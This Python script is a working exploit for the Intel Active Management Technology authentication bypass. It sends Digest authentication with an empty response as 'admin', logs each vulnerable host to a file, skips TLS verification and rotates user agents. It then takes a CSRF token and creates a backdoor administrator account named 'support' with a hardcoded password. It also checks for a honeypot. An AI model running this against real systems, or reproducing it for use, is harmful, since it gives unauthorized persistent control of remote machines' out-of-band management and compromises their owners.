from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
# disable warning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



def obtain_header(s, url):
    # to obtain header nonce
    print('[+] Try to get nonce + realm from header')
    try:
        res = s.get('%s%s' % (url, 'index.htm'), allow_redirects=False, timeout=5, verify=False)
    except:
        return False
    
    auth = res.headers['WWW-Authenticate'].replace('Digest', '').replace(',', '"').replace(' ', '"').split('"')
    auth = [x for x in auth if x]

    nonce = auth[auth.index('nonce=')+1]
    realm = auth[auth.index('realm=')+1]
    print('\t=> realm : Digest%s' % realm)
    print('\t=> nonce : %s\n' % nonce)

    header = ''.join([
            'username="%s", '     % 'admin',
            'realm="Digest%s", '% realm,
            'nonce="%s", '      % nonce,
            'uri="%s", '        % 'index.htm',
            'response="", ',
            'qop=auth, ',
            'nc=%s, '           % '00000001',
            'cnonce="", ',
            
            
            
    ])
    s.headers['Authorization'] = 'Digest ' + header
    res = s.get('%s%s' % (url, 'index.htm'), allow_redirects=False, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    if 'Copyright' in res.text:
        print('\n[+] Woah, it\'s Vulnerable as F*CK !?')
        version = soup.find('h1', {'class':'tm', 'align':'center'}).text.replace(' Active Management Technology ', ' AMT ').strip('All Rights Reserved.   ')
        print('\t => %s\n' % version)
        if url in open('vuln_server.txt', 'r').read():
            print('\n\t[*] target is already on the log file')
            return False
        else:
            open('vuln_server.txt', 'a').write('{0}\t\t= {1}\n'.format(url, version))
            return True
    else:
        print('\n[-] Not VUlnerAble ?')
        return False
    
def req_account(s, url):
    auth = s.headers['Authorization'].replace('Digest', '').replace(',', '"').replace(' ', '"').split('"')
    auth = [x for x in auth if x]

    nonce = auth[auth.index('nonce=')+1]
    realm = auth[auth.index('realm=')+1]
    
    # getting csrf token
    print('[+] Request csrf token on acl.htm')
    uri = 'acl.htm'
    nc = '0000000a'
    header = ''.join([
            'username="%s", '     % 'admin',
            'realm="Digest%s", '% realm,
            'nonce="%s", '      % nonce,
            'uri="%s", '        % uri,
            'cnonce="", ',
            'nc=%s, '           % nc,
            'qop=auth, ',
            'response=""',
    ])
    s.headers['Authorization'] = 'Digest ' + header
    res = s.get('%s%s' % (url, uri), allow_redirects=False, verify=False)
    if 'zaup' in res.text:
        print("\t=> Too bad, it's a honeypot")
        return res
    soup = BeautifulSoup(res.text, 'html.parser')
    token = soup.find('input', {'name': 't'})['value']
    print('[*] Token : %s' % token)

    # request page for new user
    uri = 'user.htm'
    nc = '00000013'
    data = {
        't': token,
        'UserName': 'admin',
        'UserSubmit': soup.find_all('input', {'name': 'UserSubmit'})[0]['value']
    }
    header = ''.join([
            'username="%s", '   % 'admin',
            'realm="Digest%s", '% realm,
            'nonce="%s", '      % nonce,
            'uri="%s", '        % uri,
            'response=""',
            'qop=auth, ',
            'nc=%s, '           % nc,
            'cnonce="", ',
    ])
    s.headers['Authorization'] = 'Digest ' + header
    res = s.post('%s%s' % (url, uri), data=data, allow_redirects=False, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    token = soup.find('input', {'name': 't'})['value']

    # create administator account
    print('[+] Create evil account ...')
    uri = 'userform'
    nc = '0000001c'
    data = {
        't': token,
        'UserName': 'support',
        'UserPwd': 'Qwe123!@#',
        'UserPwd2': 'Qwe123!@#',
        'OldUserName': '',
        'command': '1',
        'UserSubmit': 'Submit'
    }
    header = ''.join([
            'username="%s", '   % 'admin',
            'realm="Digest%s", '% realm,
            'nonce="%s", '      % nonce,
            'uri="%s", '        % uri,
            'response=""',
            'qop=auth, ',
            'nc=%s, '           % nc,
            'cnonce="", ',
    ])
    s.headers['Authorization'] = 'Digest ' + header
    res = s.post('%s%s' % (url, uri), data=data, allow_redirects=False, verify=False)

    uri = res.headers['Location']
    if uri == '/acl.htm?msg=65282':
        print('[+] Successfuly added new administrator')
        nc = '0000001d'
        header = ''.join([
                'username="%s", '     % 'admin',
                'realm="Digest%s", '% realm,
                'nonce="%s", '      % nonce,
                'uri="%s", '        % uri,
                'cnonce="", ',
                'nc=%s, '           % nc,
                'qop=auth, ',
                'response=""',
        ])
        s.headers['Authorization'] = 'Digest ' + header
        res = s.get('%s%s' % (url, uri), allow_redirects=False, verify=False)
    else:
        print('[-] Failed, smth is not right ?')
    return res


if __name__ == '__main__':
    print(
'''
____________INTEL_GOES_SKRAAAAAA____________
|=''')
    while True:
        s = requests.Session()
        url = str(input('|> '))
        if 'url' in open('vuln_server.txt', 'r').read():
            print('\n\t[*] target is already on the log file')
            continue
        s.headers['User-Agent'] = generate_user_agent()
        # first request to obtain realm + digest
        check=obtain_header(s, url)
        if check:
            res=req_account(s, url)
            print(res.headers)